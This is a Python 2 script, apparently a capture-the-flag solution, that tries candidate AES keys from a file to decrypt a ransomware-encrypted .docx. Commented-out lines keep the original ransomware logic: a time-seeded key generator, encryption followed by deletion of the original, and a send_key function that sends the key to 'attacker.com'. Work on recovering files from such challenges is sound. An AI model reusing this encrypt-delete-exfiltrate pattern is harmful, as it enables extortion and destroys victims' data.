#!/usr/bin/python
#encoding=utf-8
'''
  _    _     ___   ____ _  _____ _____    _  
 | |  | |   / _ \ / ___| |/ /_ _|_   _|  | | 
/ __) | |  | | | | |   | ' / | |  | |   / __)
\__ \ | |__| |_| | |___| . \ | |  | |   \__ \
(   / |_____\___/ \____|_|\_\___| |_|   (   /
 |_|                                     |_| 

'''

from Crypto.Cipher import AES
import random
import time
import os

plaintext_file = "secret"
encrypted_file = "secret.docx.enc"
IV = "\x42" * AES.block_size

#def send_key(key):
#    '''
#    Send the encryption key to our server.
#    '''
#    import requests
#    requests.get("https://attacker.com", params = {"file" : plaintext_file, "key" : key})

# def generate_key(size):
#     key = bytearray()
#     #print key,"\n-------------------"
#     random.seed(int(time.time()))
#     for _ in range(size):
#         key.append(random.randint(0, 255))
#     #    print key.
#     #print "".join(map(lambda b: format(b, "02x"), key))
#     return str(key)

# def pad(text):
#     return text + (AES.block_size - len(text) % AES.block_size) * "\xff"

def decrypt(ciphertext, cipher):
    return cipher.decrypt((ciphertext).decode('hex'))

# def decrypt(ciphertext, cipher):
#     unpad = lambda s: s[:-s[-1]]
#     # iv = ciphertext[:AES.block_size]
#     # cipher = AES.new(key, AES.MODE_CBC, iv)
#     plaintext = unpad(cipher.decrypt(ciphertext))[AES.block_size:]

#     return plaintext

def main(key,i):
    with open(encrypted_file, 'r') as f:
        ciphertext = f.read()
    #key = generate_key(32)
    # send_key(key.encode('hex'))
    cipher = AES.new(key, IV=IV, mode=AES.MODE_CBC)
    plaintext = decrypt(ciphertext, cipher)
    with open(plaintext_file+str(i)+".docx", 'w') as f:
        f.write(plaintext)
    # 😈
    # os.remove(plaintext_file)
    # with open(plaintext_file, 'r') as f:
    #     plaintext = f.read()
    # key = generate_key(32)
    # # send_key(key.encode('hex'))
    # cipher = AES.new(key, IV=IV, mode=AES.MODE_CBC)
    # ciphertext = encrypt(plaintext, cipher)
    # with open(encrypted_file, 'w') as f:
    #     f.write(ciphertext)
    # 😈
    # os.remove(plaintext_file)
# def decrypt(ciphertext, key):
#     #iv = ciphertext[:AES.block_size]
#     cipher = AES.new(key, AES.MODE_CBC, IV)
#     plaintext = cipher.decrypt(ciphertext[AES.block_size:])
#     return plaintext.rstrip(b"\0")

# def decrypt_file(file_name, key,i):
#     with open(file_name, 'rb') as fo:
#         ciphertext = fo.read().decode('hex')
#     dec = decrypt(ciphertext, key)
#     with open(plaintext_file+str(i)+".dat", 'wb') as fo:
#         fo.write(dec)


if __name__ == "__main__":
    file = open("output1.dat",'r').read().splitlines();
    i=1;
    for line in file:
        print line;
        line = line.decode('hex');
        #decrypt_file(encrypted_file,line,i)
        main(line,i);
        i = i+1;
